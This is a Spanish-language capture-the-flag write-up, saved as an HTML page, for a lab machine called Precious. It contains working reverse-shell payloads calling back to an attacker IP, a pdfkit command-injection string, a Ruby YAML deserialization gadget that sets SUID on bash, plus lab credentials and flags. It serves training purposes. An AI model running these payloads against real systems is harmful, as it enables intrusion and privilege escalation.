@@ -1,0 +1,168 @@
+<!DOCTYPE html>
+<!-- saved from url=(0050)https://secret.club/2022/05/11/fuzzing-solana.html -->
+<html lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1"><meta name="theme-color" content="#111111"><meta property="og:image" content="/assets/twitter.png"><link rel="preload" href="./fonts.min.css" as="style"><link rel="stylesheet" href="./fonts.min.css"><link rel="alternate" type="application/atom+xml" title="juanchan.es RSS" href="https://juanchan.es">
+
+    <title>Máquina 1</title>
+
+
+    <meta name="generator" content="Jekyll v3.9.3"><meta property="og:title" content="maquinas/ctf"><meta name="author" content="addison"><meta property="og:locale" content="en_US"><meta name="description" content="maquinas/ctf juanchan.es"><meta property="og:description" content="maquinas/ctf juanchan.es"><link rel="canonical" href="https://juachan.es"><meta property="og:url" content="https://juachan.es"><meta property="og:site_name" content="juanchan"><meta property="og:type" content="article"><meta property="article:published_time" content="2022-05-11T07:00:00+00:00"><script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"addison"},"dateModified":"2022-05-11T07:00:00+00:00","datePublished":"2022-05-11T07:00:00+00:00","description":"maquinas/ctf juanchan.es","headline":"maquinas/ctf juanchan","mainEntityOfPage":{"@type":"WebPage","@id":"https://juanchan.es"},"url":"https://juanchan.es"}</script><style> * { margin: 0; padding: 0; box-sizing: border-box; color: inherit; text-decoration: inherit; } html { background: var(--bg-0); color: var(--text-0); width: 100%; text-rendering: optimizeLegibility; font-feature-settings: "kern" 1; font-feature-settings: "liga" 1; min-width: 100vw; overflow-x: hidden; -webkit-text-size-adjust: 100%; } @media all and (min-width:640px) { html{ font-size: 16.5px; } } @media all and (min-width:720px) { html{ font-size: 17px; } } @media all and (min-width:960px) { html{ font-size: 18px; } } body { max-width: 944px; margin: 0 auto; padding: 0 24px; font-family: "Charter", serif; } header, h1, h2, h3, .sans { font-family: 'Space Grotesk', Helvetica, sans-serif; } code, .mono, summary { font-family: 'Source Code Pro', monospace; font-weight: 500; } .img-right { float: right; height: 300px; padding-left: 2em } body > header { display: flex; justify-content: space-between; align-items: center; margin: 2em 0; } nav a { margin-left: 1.5em; letter-spacing: 0.07em; font-size: .9rem; } :root { --text-0: rgba(255, 255, 255, 87%); --text-1: rgba(255, 255, 255, 60%); --bg-0: #121212; --bg-1: rgba(255, 255, 255, 5%); --bg-2: rgba(255, 255, 255, 12%); --accent: #ef5350; --keyword: #b794f6; --string: #89a2f6; --literal: #f88478; --type: #f8819c; } @media (prefers-color-scheme: light) { :root { --text-0: rgba(0, 0, 0, 87%); --text-1: rgba(0, 0, 0, 66%); --bg-0: #fff; --bg-1: #f2f2f2; --bg-2: rgba(0, 0, 0, 12%); --keyword: #7c4dff; --string: #586ada; --literal: #d14641; --type: #bd00f8; } } .tags, .pagination > :nth-child(2) { margin-bottom: 2rem; } .tags, .pagination .mono { color: var(--text-1); font-size: 0.8rem; } .tags > a, .pagination .mono { color: var(--accent); } .pagination { display: flex; justify-content: space-between; flex-wrap: wrap-reverse; } .pagination > a { font-size: 0.9rem; display: inline-block; } .pagination .mono { letter-spacing: 0.07em; } article > :not(main) { font-size: 16px; } article > h1 { font-size: 2rem; margin-bottom: 12px; } .authors { position: absolute; margin-top: 4px; color: var(--text-1); } .authors > a { color: var(--text-0); } article > div > img { display: inline; object-fit: cover; height: 48px; width: 48px; border-radius: 100%; margin-right: 8px; background: var(--bg-1); } article > time { color: var(--text-1); position: absolute; margin: -24px 0 0 56px; } article > hr { width: 128px; border: 2.5px solid var(--bg-1); margin-top: 12px; } main { margin: 2rem 0; } main > :nth-last-child(2) { margin-bottom: 2rem; } main img, main video, main iframe, main object { max-width: 100%; height: auto; display: flex; margin: auto; } main iframe { width: 100%; height: 504px; } p, ul, ol { line-height: 1.35; margin-bottom: 1rem; } details + :not(details) { margin-top: 1rem; } details + h3, details + h2, details + h1 { margin-top: 1.2rem; } object { margin-bottom: 1rem; } h1, h2, h3 { position: relative; margin: 1.2rem 0 0.2rem 0; } h3, h2 { line-height: 24px; } main h1:before, h2:before, h3:before { content: "#"; color: var(--accent); font-weight: bold; float: left; margin-left: -19px; position: absolute; } h3:before { content: ""; margin-left: -17px; height: 10px; width: 10px; background: var(--accent); border-radius: 100%; top: calc(50% - 6px); } h1 { font-size: 1.3em; } h2 { font-size: 1.2em; } h3 { font-size: 1.1em; } p a, main li a { text-decoration: underline; } summary { margin-left: -17px; cursor: pointer; } summary::marker { color: var(--accent); } details :nth-child(2) { margin-top: 0.8rem; } ul { list-style: none; } ul li, ol li { padding-left: 1rem; margin: 0 0 0.2rem 1rem; } ul li::before { content: "•"; float: left; margin-left: -2rem; transform: scale(1.4); } blockquote { color: var(--text-1); font-style: italic; margin: 0 2em; } .footnotes { border-top: 1px solid var(--bg-1); padding-top: 1rem; } pre { border-left: 4px solid var(--bg-1); margin: 0 0 1rem -24px; padding-left: 20px; overflow-x: scroll; scrollbar-width: none; -ms-overflow-style: none; } pre::-webkit-scrollbar { width: 0; height: 0; } :not(pre) > code { background: var(--bg-1); padding: 2px 4px; } pre > code { display: inline-block; } code { font-size: 14px; } @media screen and (min-width: 640px) { code { font-size: 15px; } } @media screen and (max-width: 944px) { main iframe { height: calc((100vw - 24px) * 0.5625); } blockquote { margin: 0 0 0 1.25em; } ul li::before { margin-left: -1.25rem; } ul li { padding-left: 0.625rem; margin-left: 0.625rem; } ol li { padding-left: 0.25rem; } } .aside { color: var(--text-1); } @media screen and (min-width: 1074px) { article::before { background: radial-gradient( circle at center, var(--bg-1) 25%, transparent 25% ), transparent; background-size: 10px 10px; content: ""; display: block; height: 300px; width: 300px; position: absolute; transform: translate(-72px, -72px); z-index: -1; } article { padding: 24px 0 0 24px; margin: -24px 0 0 -24px; background: var(--bg-0); } article h1:first-of-type { margin-top: 0; } body > header { margin-bottom: 5em; } } @media screen and (max-width: 1584px) { .aside { position: relative; padding: 4px 0 4px 0; border-bottom: 1.5px solid var(--bg-1); border-top: 1.5px solid var(--bg-1); } } @media screen and (min-width: 1584px) { .aside { float: left; position: absolute; left: 0; transform: translate(calc(-100% - 28px), calc(-100% - 1rem)); width: 320px; text-align: right; clear: both; } footer { position: absolute; left: calc(100% + 24px); width: 320px; top: 0; } } code .gu, code .gh { font-weight: bold; } code .p { color: var(--text-1); } code .c, code .ch, code .cm, code .cp, code .cpf, code .c1, code .cs { color: var(--text-1); } code .o, code .ow { color: var(--keyword); } code .k, code .kn, code .kc, code .kp, code .kr, code .nt, code b { color: var(--keyword); font-weight: bold; } code .kt, code .kd, code .nb, code .nl, code .nv, code .vc, code .vg, code .vi, code .vm, code .gd { color: var(--type); } code .m, code .mb, code .mf, code .mh, code .mi, code .mo, code .il, code .se { color: var(--literal); } code .s, code .sa, code .sb, code .sc, code .dl, code .sd, code .s2, code .sh, code .si, code .sx, code .sr, code .s1, code .ss, code .gi { color: var(--string); }</style>
+    </head>
+
+
+<body><header align="center"><a href="/maquinas.html">Máquinas/CTF</a><nav><a href="/">Sobre mi</a></nav></header>
+
+
+    <article aria-label="Content" itemscope="" itemtype="http://schema.org/BlogPosting"><h1 itemprop="name headline">Máquina resuelta</h1><div itemprop="author" itemscope="" itemtype="http://schema.org/Person" style="height:48px"> <img itemprop="image" alt="main authors image" src="./precious.jpg"> <span class="mono authors"> <a href="https://secret.club/author/addison" itemprop="name">Precious</a> </span></div><time datetime="2022-05-11T07:00:00+00:00" itemprop="datePublished" class="mono"> Feb, 2023 </time><hr><main itemprop="articleBody" style="position: relative">
+
+
+
+
+<h2 id="comprobación-del-sistema-operativo">1. Comprobación del sistema operativo</h2>
+<pre><code>python whichSystem.py 10.10.11.189
+</code></pre>
+<p>Tiene como salida:</p>
+<pre class=" language-bash"><code class="prism  language-bash">10.10.11.189 <span class="token punctuation">(</span>ttl -<span class="token operator">&gt;</span> 63<span class="token punctuation">)</span>: Linux
+</code></pre>
+<p>&nbsp;</p>
+<h2 id="comprobamos-servicios-y-lanzamos-scripts-principales-contra-los-principales-puertos">2. Comprobamos servicios y lanzamos scripts principales contra los principales puertos</h2>
+<pre><code>nmap -Pn -sCV -p- 10.10.11.189
+</code></pre>
+<p>Obteniendo el siguiente resultado:</p>
+<pre><code>Starting Nmap 7.93SVN ( https://nmap.org ) at 2023-02-27 12:18 CET
+Nmap scan report for 10.10.11.189
+Host is up (0.037s latency).
+Not shown: 65533 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
+| ssh-hostkey: 
+|   3072 84:5e:13:a8:e3:1e:20:66:1d:23:55:50:f6:30:47:d2 (RSA)
+|   256 a2:ef:7b:96:65:ce:41:61:c4:67:ee:4e:96:c7:c8:92 (ECDSA)
+|_  256 33:05:3d:cd:7a:b7:98:45:82:39:e7:ae:3c:91:a6:58 (ED25519)
+80/tcp open  http    nginx 1.18.0
+|_http-title: Did not follow redirect to http://precious.htb/
+|_http-server-header: nginx/1.18.0
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 140.63 seconds
+</code></pre>
+<p>Por lo que debemos añadir entonces <strong>precious.htb</strong> al archivo <code>etc/hosts</code>.</p>
+<p>&nbsp;</p>
+<h2 id="observamos-la-página-web">3. Observamos la página web</h2>
+<p>Si accedemos a la web podemos ver como existe un convertidor de <em>webpage</em> a pdf. Para probarlo podemos lanzar un servidor web en nuestra máquina, para convertir dicho recurso web en un pdf.</p>
+<pre><code>sudo python -m http.server 8000
+</code></pre>
+<p>Una vez convertido, vemos que si hacemos una peticion a dicha dirección nos genera y descarga un archivo pdf. Se nos podría ocurrir meter en el archivo html, que muestra nuestro servidor, una inyección <strong>XSS</strong>, para que por ejemplo, muestre el archivo <code>/etc/passwd</code>, estableciendo para ello lo siguiente:</p>
+<pre class=" language-html"><code class="prism  language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">&gt;</span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>iframe</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>file:///etc/passwd<span class="token punctuation">"</span></span> <span class="token attr-name">width</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>800px<span class="token punctuation">"</span></span> <span class="token attr-name">height</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>600px<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>iframe</span><span class="token punctuation">&gt;</span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">&gt;</span></span>
+</code></pre>
+<p>Vemos como se realiza la petición a nuestro servidor, pero en el archivo pdf generado no se nos muestra nada.</p>
+<p>&nbsp;</p>
+<h2 id="observamos-el-pdf-generado">4. Observamos el pdf generado</h2>
+<p>Se nos ocurre mirar los <em>metadatos</em> del archivo pdf generado, a través de la herramienta <strong>exiftool</strong>:</p>
+<pre><code>exiftool vexun3traf093pmqz68y50nxl5hffh1t.pdf
+</code></pre>
+<p>Observando los siguientes metadatos:</p>
+<pre><code>ExifTool Version Number         : 12.50
+File Name                       : vexun3traf093pmqz68y50nxl5hffh1t.pdf
+Directory                       : .
+File Size                       : 18 kB
+File Modification Date/Time     : 2023:02:27 12:38:01+01:00
+File Access Date/Time           : 2023:02:27 12:38:01+01:00
+File Inode Change Date/Time     : 2023:02:27 12:38:06+01:00
+File Permissions                : -r--------
+File Type                       : PDF
+File Type Extension             : pdf
+MIME Type                       : application/pdf
+PDF Version                     : 1.4
+Linearized                      : No
+Page Count                      : 1
+Creator                         : Generated by pdfkit v0.8.6
+</code></pre>
+<p>Vemos que entre dichos datos se encuentra el servicio y la versión con la que se está generando el pdf, en este caso con <strong>pdfkit v0.8.6</strong>, por lo que podemos buscar posibles vulnerabilidades a través de Internet.</p>
+<p>&nbsp;</p>
+<h2 id="explotando-el-generador-de-pdfs">5. Explotando el generador de pdfs</h2>
+<p>Encontramos una vulnerabilidad que afecta a dicho servicio y versión, mediante la cual podemos ejecutar comandos directamente introduciendo la url de la web objetivo junto con <em>payload</em>. Por ejemplo podemos ejecutar lo siguiente:</p>
+<pre><code>http://10.10.14.77:8000?name=%20`whoami`
+</code></pre>
+<p>Podemos entonces intentar ejecutar una <em>revershell</em>, mediante el siguiente comando:</p>
+<pre><code>http://10.10.14.77:8000?name=%20`sh -i &gt;&amp; /dev/tcp/10.10.14.77/1234 0&gt;&amp;1`
+</code></pre>
+<p>Vemos que esto no nos funciona y probamos con la siguiente con la siguiente peticón, mediante la cual intentamos obtener una revershell mediante un ejecutable de <strong>Python</strong>.</p>
+<pre><code>http://10.10.14.77:8000?name=%20`python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.77",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'`
+</code></pre>
+<p>Si en nuestra máquina host lanzamos un <em>netcat</em> escuchando, observamos como si que somos capaces de obtener una <em>shell</em> con el usuario <strong>ruby</strong>.</p>
+<p>&nbsp;</p>
+<h2 id="sanitizamos-la-shell">6. Sanitizamos la shell</h2>
+<p>Los comandos básicos para sanitizar una shell son los siguientes:</p>
+<pre><code>script /dev/null -c bash
+ctrl + z
+
+stty raw -echo; fg
+reset
+xterm
+</code></pre>
+<p>&nbsp;</p>
+<h2 id="observamos-los-recursos-del-sistema">7. Observamos los recursos del sistema</h2>
+<p>Observamos el directorio <em>home</em> del usuario <strong>ruby</strong>, en el que podemos encontrar un directorio llamada <code>.bundle</code>. Si accedemos a su archivo de configuración, podemos observar lo siguiente:</p>
+<pre><code>henry:Q3c1AqGHtoI0aXAYFH
+</code></pre>
+<p>Intentamos acceder mediante <strong>ssh</strong> como el usuario <code>henry</code>.</p>
+<pre><code>ssh henry@10.10.11.189
+</code></pre>
+<p>&nbsp;</p>
+<h2 id="flag-de-usuario">8. Flag de usuario</h2>
+<p>Somos capaces de obtener la flag de usuario -&gt; <em>a13e7efa79c1bf2dfef5e7b88388f992</em></p>
+<p>&nbsp;</p>
+<h2 id="escalada-de-privilegios">9. Escalada de privilegios</h2>
+<p>Comprobamos si el usuario <strong>henry</strong> tiene alguna capacidad mediante el comando <code>sudo -l</code>, y observamos lo siguiente:</p>
+<pre><code>User henry may run the following commands on precious:
+ (root) NOPASSWD: /usr/bin/ruby /opt/update_dependencies.rb
+</code></pre>
+<p>Si comprobamos dicho archivo <code>/opt/update_dependencies.rb</code>, observamos que realiza un <code>YAML.load</code> de un fichero llamado <strong>dependecies.yml</strong>. Podemos entonces probar a ejecutar el siguiente comando:</p>
+<pre><code>/usr/bin/ruby /opt/update_dependencies.rb 
+</code></pre>
+<p>Como salida obtenemos que dicho fichero no existe, por lo que procedemos a crearlo</p>
+<p>&nbsp;</p>
+<h2 id="creación-del-fichero-yml">10. Creación del fichero YML</h2>
+<p>Buscando por internet nos aparecen diferentes recursos, en los que se ponen como ejemplo la ejecución de comandos desde un archivo <code>.yml</code>. Para ello podemos establecer lo siguiente en este nuevo archivo:</p>
+<pre class=" language-yml"><code class="prism  language-yml"><span class="token punctuation">---</span>
+<span class="token punctuation">-</span> <span class="token tag">!ruby/object:Gem::Installer</span>
+    <span class="token key atrule">i</span><span class="token punctuation">:</span> x
+<span class="token punctuation">-</span> <span class="token tag">!ruby/object:Gem::SpecFetcher</span>
+    <span class="token key atrule">i</span><span class="token punctuation">:</span> y
+<span class="token punctuation">-</span> <span class="token tag">!ruby/object:Gem::Requirement</span>
+  <span class="token key atrule">requirements</span><span class="token punctuation">:</span>
+    <span class="token tag">!ruby/object:Gem::Package::TarReader</span>
+    <span class="token key atrule">io</span><span class="token punctuation">:</span> <span class="token important">&amp;1</span> <span class="token tag">!ruby/object:Net::BufferedIO</span>
+      <span class="token key atrule">io</span><span class="token punctuation">:</span> <span class="token important">&amp;1</span> <span class="token tag">!ruby/object:Gem::Package::TarReader::Entry</span>
+         <span class="token key atrule">read</span><span class="token punctuation">:</span> <span class="token number">0</span>
+         <span class="token key atrule">header</span><span class="token punctuation">:</span> <span class="token string">"abc"</span>
+      <span class="token key atrule">debug_output</span><span class="token punctuation">:</span> <span class="token important">&amp;1</span> <span class="token tag">!ruby/object:Net::WriteAdapter</span>
+         <span class="token key atrule">socket</span><span class="token punctuation">:</span> <span class="token important">&amp;1</span> <span class="token tag">!ruby/object:Gem::RequestSet</span>
+             <span class="token key atrule">sets</span><span class="token punctuation">:</span> <span class="token tag">!ruby/object:Net::WriteAdapter</span>
+                 <span class="token key atrule">socket</span><span class="token punctuation">:</span> <span class="token tag">!ruby/module</span> <span class="token string">'Kernel'</span>
+                 <span class="token key atrule">method_id</span><span class="token punctuation">:</span> <span class="token punctuation">:</span>system
+             <span class="token key atrule">git_set</span><span class="token punctuation">:</span> <span class="token string">"chmod +s /bin/bash"</span>
+         <span class="token key atrule">method_id</span><span class="token punctuation">:</span> <span class="token punctuation">:</span>resolve
+</code></pre>
+<p>A modo de resumen, en dicho archivo le decimos que cambie los permisos de <code>/bin/bash</code> para que cualquier user lo pueda ejecutar. Este lo enviamos mediante un servidor de python de nuestra maquina a la maquina objetivo, y lo guardamos en el directorio <code>/home/henry</code>.</p>
+<p>Si volvemos a ejecutar el script, observamos como somos capaces de obtener una <em>shell</em> como el usuario <strong>root</strong>.</p>
+<p>&nbsp;</p>
+<h2 id="obtención-flag-usuario-root">11. Obtención flag usuario root</h2>
+<p>Somos entonces capaces de obtener el flag del usuario <strong>root</strong> -&gt; <em>1fb7886a85d1d6f7b4c7827d4108a63d</em></p>
+
+
+
+
+
+
+
+<p>&nbsp;</p><p>&nbsp;</p>
+</div>
+     <div class="footer-credits" style="display: flex; justify-content: flex-end">
+        <a> Made by Juan González </a>
+    </div>
+</div>
+</body></html>
